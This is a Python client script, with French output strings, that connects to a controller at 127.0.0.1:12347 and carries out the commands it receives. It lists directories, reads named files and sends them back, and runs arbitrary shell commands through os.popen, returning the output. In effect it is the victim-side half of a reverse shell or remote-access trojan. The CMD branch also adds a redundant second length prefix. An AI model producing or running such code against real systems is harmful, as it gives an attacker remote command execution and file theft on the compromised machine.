import socket
import os

def send_data(s, data):
    size = str(len(data))
    s.sendall(size.encode() + b'#')
    s.sendall(data.encode())

def receive_data(s):
    size = ""
    while True:
        byte = s.recv(1)
        if byte.decode() == "#":
            break
        size += byte.decode()
    size = int(size)
    data = s.recv(size)
    return data.decode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 12347))

    while True:
        data = receive_data(s)
        if not data:
            s.shutdown(2)
            s.close()
            exit()

        order, param = (data.split("#", 1) + [""])[:2]

        if order == "LIST":
            tosend = "-----Listes des fichiers-----\n" + "\n".join(
                f"[{i}]{file}" for i, file in enumerate(os.listdir(param))
            )
            send_data(s, tosend)

        elif order == "UPLOAD":
            with open(param, "r") as f:
                tosend = f.read()
            send_data(s, tosend)

        elif order == "CMD":
            tosend = os.popen(param).read()
            send_data(s, str(len(tosend)) + "#" + tosend)

